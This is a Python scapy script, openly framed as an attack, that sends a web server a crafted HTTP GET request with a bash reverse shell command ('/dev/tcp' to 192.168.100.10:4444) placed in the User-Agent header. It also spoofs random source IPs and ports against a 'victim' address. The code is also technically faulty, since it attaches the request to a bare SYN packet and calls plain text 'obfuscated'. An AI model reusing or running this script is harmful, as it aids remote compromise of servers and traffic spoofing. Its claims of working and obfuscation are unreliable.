import scapy.all as scapy
import random

# Function to create the obfuscated HTTP GET request with embedded reverse shell payload
def obfuscated_http_attack(target_ip, target_port):
    try:
        # Obfuscated reverse shell payload (hidden inside the user-agent or other fields)
        payload = """bash -i >& /dev/tcp/192.168.100.10/4444 0>&1"""
        
        # Create an HTTP GET request with the reverse shell payload obfuscated
        http_payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {payload}\r\n\r\n"
        
        # Randomize source IP and source port
        src_ip = f"192.168.1.{random.randint(2, 254)}"
        src_port = random.randint(1024, 65535)

        # Create the IP and TCP headers
        ip = scapy.IP(src=src_ip, dst=target_ip)
        tcp = scapy.TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1, 65535))

        # Send the crafted HTTP request with malicious payload
        packet = ip / tcp / http_payload
        scapy.send(packet, verbose=False)

        print(f"Sent HTTP GET request from {src_ip}:{src_port} to {target_ip}:{target_port}")
    
    except Exception as e:
        print(f"Error: {e}")

# Main function to start the attack
def main():
    # Set the target IP and port (web server port, e.g., 80 for HTTP)
    target_ip = "192.168.100.5"  # Change this to the victim's IP address
    target_port = 80  # HTTP port

    print("Starting HTTP GET request with embedded reverse shell payload...")

    # Run the obfuscated HTTP attack
    obfuscated_http_attack(target_ip, target_port)

if __name__ == "__main__":
    main()
